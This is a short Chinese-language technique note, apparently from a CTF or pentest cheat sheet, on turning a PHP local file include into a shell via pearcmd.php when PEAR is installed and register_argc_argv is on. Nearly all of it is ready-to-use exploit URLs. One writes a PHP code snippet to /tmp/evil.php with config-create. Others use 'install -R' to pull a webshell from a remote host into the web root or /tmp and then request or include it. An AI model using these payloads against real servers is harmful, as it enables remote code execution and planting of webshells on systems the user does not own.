# pear+register_argc_argv 利用

假如存在以下环境：

- 安装了 pear

- 开启了 registerargcargv

- 存在可控的 include $_GET['f'](即使是 include $_GET['f'].php)

那么我们就可以通过上面的知识实现任意文件下载从而 getshell:

```txt
//通过本地直接写入 webshell, 注意这里最好抓包然后用 burpsuite 或者直接 curl 执行，否则浏览器会将< ? > 转义
// config-create 可以直接创建配置文件，且第一个参数必须以/开头
http://ip:port/include.php?f=pearcmd&+config-create+/<?=phpinfo();?>+/tmp/evil.php
// 通过远程直接下载 webshell
// web 目录可写
- http://ip:port/include.php?f=pearcmd&+install+-R+/var/www/html+http://ip:port/evil.php
- http://ip:port/tmp/pear/download/evil.php
// tmp 目录可写
- http://ip:port/include.php?f=pearcmd&+install+-R+/tmp+http://ip:port/evil.php
- http://ip:port/include.php?f=/tmp/pear/download/evil
```
